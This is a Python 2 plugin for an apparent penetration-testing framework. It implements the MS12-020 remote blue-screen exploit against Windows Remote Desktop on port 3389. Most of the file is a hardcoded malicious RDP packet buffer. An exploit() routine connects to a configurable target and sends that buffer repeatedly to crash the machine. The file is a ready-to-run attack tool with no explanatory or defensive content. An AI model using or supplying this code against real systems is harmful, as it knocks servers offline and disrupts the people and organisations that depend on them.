# -*- coding: cp936 -*-
'''
mst=>plugin=>exploit
ms12_020
'''
from socket import *
class mstplugin:
    '''ms12_020'''
    infos = [
        ['插件','ms12_020 远程3389蓝屏Exploit'],
        ['作者','mst'],
        ['更新','2013/10/22'],
        ['网址','http://mstoor.duapp.com/']
        ]
    opts  = [
        ['RHOST','192.168.1.2','REMOTE HOST'],
        ['RPORT','3389','REMOTE PORT'],
        ['TIMES','100','SEND BUF TIMES'],
        ['TIMEOUT','5','SOCK SETTIMEOUT'],
        ['PAYLOAD','false','NO RETURN PAYLOAD']
        ]
    buf=""
    buf+="\x03\x00\x00\x13\x0e\xe0\x00\x00" 
    buf+="\x00\x00\x00\x01\x00\x08\x00\x00" 
    buf+="\x00\x00\x00\x03\x00\x01\xd6\x02" 
    buf+="\xf0\x80\x7f\x65\x82\x01\x94\x04" 
    buf+="\x01\x01\x04\x01\x01\x01\x01\xff" 
    buf+="\x30\x19\x02\x04\x00\x00\x00\x00" 
    buf+="\x02\x04\x00\x00\x00\x02\x02\x04" 
    buf+="\x00\x00\x00\x00\x02\x04\x00\x00" 
    buf+="\x00\x01\x02\x04\x00\x00\x00\x00" 
    buf+="\x02\x04\x00\x00\x00\x01\x02\x02" 
    buf+="\xff\xff\x02\x04\x00\x00\x00\x02" 
    buf+="\x30\x19\x02\x04\x00\x00\x00\x01" 
    buf+="\x02\x04\x00\x00\x00\x01\x02\x04" 
    buf+="\x00\x00\x00\x01\x02\x04\x00\x00" 
    buf+="\x00\x01\x02\x04\x00\x00\x00\x00" 
    buf+="\x02\x04\x00\x00\x00\x01\x02\x02" 
    buf+="\x04\x20\x02\x04\x00\x00\x00\x02" 
    buf+="\x30\x1c\x02\x02\xff\xff\x02\x02" 
    buf+="\xfc\x17\x02\x02\xff\xff\x02\x04" 
    buf+="\x00\x00\x00\x01\x02\x04\x00\x00" 
    buf+="\x00\x00\x02\x04\x00\x00\x00\x01" 
    buf+="\x02\x02\xff\xff\x02\x04\x00\x00" 
    buf+="\x00\x02\x04\x82\x01\x33\x00\x05" 
    buf+="\x00\x14\x7c\x00\x01\x81\x2a\x00" 
    buf+="\x08\x00\x10\x00\x01\xc0\x00\x44" 
    buf+="\x75\x63\x61\x81\x1c\x01\xc0\xd8" 
    buf+="\x00\x04\x00\x08\x00\x80\x02\xe0" 
    buf+="\x01\x01\xca\x03\xaa\x09\x04\x00" 
    buf+="\x00\xce\x0e\x00\x00\x48\x00\x4f" 
    buf+="\x00\x53\x00\x54\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x04\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x0c\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x01\xca\x01\x00\x00\x00\x00" 
    buf+="\x00\x10\x00\x07\x00\x01\x00\x30" 
    buf+="\x00\x30\x00\x30\x00\x30\x00\x30" 
    buf+="\x00\x2d\x00\x30\x00\x30\x00\x30" 
    buf+="\x00\x2d\x00\x30\x00\x30\x00\x30" 
    buf+="\x00\x30\x00\x30\x00\x30\x00\x30" 
    buf+="\x00\x2d\x00\x30\x00\x30\x00\x30" 
    buf+="\x00\x30\x00\x30\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x04\xc0\x0c" 
    buf+="\x00\x0d\x00\x00\x00\x00\x00\x00" 
    buf+="\x00\x02\xc0\x0c\x00\x1b\x00\x00" 
    buf+="\x00\x00\x00\x00\x00\x03\xc0\x2c" 
    buf+="\x00\x03\x00\x00\x00\x72\x64\x70" 
    buf+="\x64\x72\x00\x00\x00\x00\x00\x80" 
    buf+="\x80\x63\x6c\x69\x70\x72\x64\x72" 
    buf+="\x00\x00\x00\xa0\xc0\x72\x64\x70" 
    buf+="\x73\x6e\x64\x00\x00\x00\x00\x00" 
    buf+="\xc0\x03\x00\x00\x0c\x02\xf0\x80" 
    buf+="\x04\x01\x00\x01\x00\x03\x00\x00" 
    buf+="\x08\x02\xf0\x80\x28\x03\x00\x00" 
    buf+="\x0c\x02\xf0\x80\x38\x00\x06\x03" 
    buf+="\xef\x03\x00\x00\x0c\x02\xf0\x80" 
    buf+="\x38\x00\x06\x03\xeb\x03\x00\x00" 
    buf+="\x0c\x02\xf0\x80\x38\x00\x06\x03" 
    buf+="\xec\x03\x00\x00\x0c\x02\xf0\x80" 
    buf+="\x38\x00\x06\x03\xed\x03\x00\x00" 
    buf+="\x0c\x02\xf0\x80\x38\x00\x06\x03" 
    buf+="\xee\x03\x00\x00\x0b\x06\xd0\x00" 
    buf+="\x00\x12\x34\x00"
    def exploit(self):
        '''start exploit'''
        color.cprint("[+] Connect to %s .."%RHOST,YELLOW)
        for i in range(int(TIMES)):
            s=socket(AF_INET,SOCK_STREAM)
            s.settimeout(int(TIMEOUT))
            try:
                s.connect((RHOST,int(RPORT)))
                color.cprint("[+] Send %-5s Bytes.."%len(self.buf),GREEN)
                s.send(self.buf)
                rec=s.recv(100)
                color.cprint("[+] Recv %-5s Bytes.."%len(rec),YELLOW)
                s.close()
            except Exception,e:
                color.cprint("[!] Exploit False !CODE:%s"%e,RED)
